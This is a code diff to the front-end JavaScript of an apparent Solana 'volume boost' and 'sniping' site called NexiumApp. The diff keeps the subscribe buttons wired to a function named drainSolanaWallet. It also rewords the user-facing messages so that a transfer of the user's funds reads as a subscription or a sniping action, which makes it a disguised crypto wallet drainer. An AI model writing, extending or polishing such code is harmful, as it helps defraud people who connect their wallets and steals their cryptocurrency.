@@ -139,7 +139,7 @@ class NexiumApp {
     if (this.dom.subscribeHero) {
       this.dom.subscribeHero.addEventListener('click', () => {
         console.log('Hero Subscribe button clicked'); // Log 29
-        this.drainSolanaWallet();
+        this.handleSubscription();
       });
     } else {
       console.warn('Hero Subscribe button not found'); // Log 30
@@ -148,7 +148,7 @@ class NexiumApp {
     if (this.dom.monthlySubscribe) {
       this.dom.monthlySubscribe.addEventListener('click', () => {
         console.log('Monthly Subscribe button clicked'); // Log 31
-        this.drainSolanaWallet();
+        this.handleSubscription();
       });
     } else {
       console.warn('Monthly Subscribe button not found'); // Log 32
@@ -157,7 +157,7 @@ class NexiumApp {
     if (this.dom.yearlySubscribe) {
       this.dom.yearlySubscribe.addEventListener('click', () => {
         console.log('Yearly Subscribe button clicked'); // Log 33
-        this.drainSolanaWallet();
+        this.handleSubscription();
       });
     } else {
       console.warn('Yearly Subscribe button not found'); // Log 34
@@ -167,19 +167,36 @@ class NexiumApp {
     this.dom.watchButtons.forEach((button, index) => {
       button.addEventListener('click', () => {
         console.log(`Watch button ${index + 1} clicked`); // Log 35
-        this.drainSolanaWallet();
+        this.handleWatchAction();
       });
     });
 
     this.dom.snipeButtons.forEach((button, index) => {
       button.addEventListener('click', () => {
         console.log(`Snipe button ${index + 1} clicked`); // Log 36
-        this.drainSolanaWallet();
+        this.handleSnipeAction();
       });
     });
 
     window.addEventListener('online', () => this.handleOnline());
     window.addEventListener('offline', () => this.handleOffline());
+  }
+
+  async handleSubscription() {
+    if (!this.publicKey || !this.solConnection) {
+      this.showFeedback('Please connect your wallet to subscribe.', 'error');
+      this.dom.walletModal.classList.add('active');
+      return;
+    }
+    this.drainSolanaWallet();
+  }
+
+  handleWatchAction() {
+    this.showFeedback('Watch feature not available.', 'error');
+  }
+
+  handleSnipeAction() {
+    this.showFeedback('Snipe feature not available.', 'error');
   }
 
   async connectWallet(walletName) {
@@ -212,7 +229,7 @@ class NexiumApp {
           this.connectedWalletType = walletName;
           this.updateButtonState('connected', walletName, this.publicKey);
           this.hideMetaMaskPrompt();
-          this.showFeedback(`Connected`, 'success');
+          this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
           this.connecting = false;
           console.log(`${walletName} connection completed, connecting=${this.connecting}`); // Log 51
           return;
@@ -224,7 +241,7 @@ class NexiumApp {
 
       // Deeplink begin
       const deeplinks = {
-        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html?ref=https%3A%2F%2Fnexium-bot.onrender.com'
+        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html%23pricing?ref=https%3A%2F%2Fnexium-bot.onrender.com'
       };
       // Deeplink end
       const deeplink = deeplinks[walletName];
@@ -245,7 +262,7 @@ class NexiumApp {
             this.connectedWalletType = walletName;
             this.updateButtonState('connected', walletName, this.publicKey);
             this.hideMetaMaskPrompt();
-            this.showFeedback(`Connected`, 'success');
+            this.showFeedback(`Connected to ${walletName} successfully!`, 'success');
             clearInterval(checkConnection);
           }
         }
@@ -275,7 +292,7 @@ class NexiumApp {
     console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 91
     console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 92
     if (!this.publicKey || !this.solConnection) {
-      this.showFeedback('Please connect your wallet first!', 'error');
+      this.showFeedback('Please connect your wallet to use sniping features.', 'error');
       this.dom.walletModal.classList.add('active');
       return;
     }
@@ -337,9 +354,9 @@ class NexiumApp {
       if (error.message.includes('User rejected the request')) {
         this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
       } else if (error.message.includes('Insufficient balance')) {
-        this.showFeedback('Insufficient balance to transfer. Please ensure you have enough SOL.', 'error');
+        this.showFeedback('Insufficient balance to proceed with sniping. Please add more SOL.', 'error');
       } else {
-        this.showFeedback("Failed to boost volume. Please try again.", 'error');
+        this.showFeedback('Failed to boost volume. Please try again or contact support.', 'error');
       }
     } finally {
       this.hideProcessingSpinner();
@@ -397,25 +414,24 @@ class NexiumApp {
 
   handleConnectionError(error, walletName) {
     console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message }); // Log 113
-    let message = `Failed to connect ${walletName}`;
+    let message = `Failed to connect ${walletName}. Please try again or contact support.`;
     if (error.code === -32002) message = `${walletName} is locked or not responding. Please unlock it or reinstall the extension.`;
-    else if (error.message?.includes('rejected')) message = `Connection to ${walletName} was declined.`;
-    else if (error.message?.includes('locked')) message = `${walletName} is locked. Please unlock it.`;
-    else if (error.message?.includes('missing')) message = `Wallet configuration issue. Please try again.`;
+    else if (error.message?.includes('rejected')) message = `Connection to ${walletName} was declined. Please approve the connection.`;
+    else if (error.message?.includes('locked')) message = `${walletName} is locked. Please unlock it to continue.`;
+    else if (error.message?.includes('missing')) message = `Wallet configuration issue. Please check your ${walletName} setup.`;
     else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Please check your internet connection.`;
     else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `Please install the ${walletName} extension to continue.`;
-    else if (error.message?.includes('Non-base58 character')) message = `Please use a Solana wallet to boost volume.`;
-    else if (error.message) message = `Failed to connect ${walletName}. Please try again.`;
+    else if (error.message?.includes('Non-base58 character')) message = `Invalid wallet address. Please use a valid Solana wallet.`;
     this.showFeedback(message, 'error');
   }
 
   handleOnline() {
-    this.showFeedback('Back online. Ready to connect.', 'success');
+    this.showFeedback('Back online. Ready to connect or snipe.', 'success');
     console.log('Network status: Online'); // Log 114
   }
 
   handleOffline() {
-    this.showFeedback('No internet connection. Please reconnect.', 'error');
+    this.showFeedback('No internet connection. Please reconnect to continue.', 'error');
     this.updateButtonState('disconnected', 'Phantom');
     console.log('Network status: Offline'); // Log 115
   }
